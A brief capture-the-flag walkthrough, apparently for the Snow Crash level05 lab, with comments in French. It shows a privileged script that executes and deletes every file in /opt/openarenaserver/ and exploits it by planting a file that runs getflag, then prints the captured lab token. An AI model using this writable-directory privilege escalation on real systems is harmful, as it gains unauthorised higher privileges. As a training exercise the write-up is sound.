# level05

```bash
$ find / -user flag05 2> /dev/null | grep -v proc
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Ce script shell est conçu pour exécuter chaque fichier situé dans le répertoire `/opt/openarenaserver/` et les supprimer ensuite.

```bash
$ echo "getflag > /tmp/flag05" > /opt/openarenaserver/script.sh
$ ls /opt/openarenaserver/
script.sh
# wait for the script to run automatically
$ ls /opt/openarenaserver/
# nothing, so the script has been executed
$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
